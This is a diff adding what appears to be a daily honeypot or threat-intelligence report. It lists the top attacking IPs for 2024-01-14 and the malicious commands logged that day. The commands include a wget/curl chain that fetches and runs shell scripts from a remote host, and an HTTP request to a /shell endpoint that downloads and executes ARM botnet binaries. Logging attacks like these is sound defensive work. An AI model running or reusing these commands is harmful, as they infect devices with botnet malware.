@@ -1,0 +1,19 @@
+Top 5 IPs for 2024-01-14:
+
+36.139.166.149
+124.235.215.252
+180.115.170.18
+222.246.43.129
+223.9.146.65
+
+Malicious commands seen:
+cd /data/local/tmp/;busybox wget http://103.245.236.152/w.sh; sh w.sh; curl http://103.245.236.152/c.sh; sh c.sh; wget http://103.245.236.152/wget.sh; sh wget.sh; curl http://103.245.236.152/wget.sh; sh wget.sh; busybox wget http://103.245.236.152/wget.sh; sh wget.sh; busybox curl http://103.245.236.152/wget.sh; sh wget.sh
+
+GET /shell?cd+/tmp;rm+bot.arm+bot.arm7;wget+http:/\\/45.95.169.14/bot.arm7;chmod+777+bot.arm7;./arm7+ipcams;wget+http:/\\/45.95.169.14/bot.arm;chmod+777+bot.arm;./bot.arm+ipcams HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9
+
+
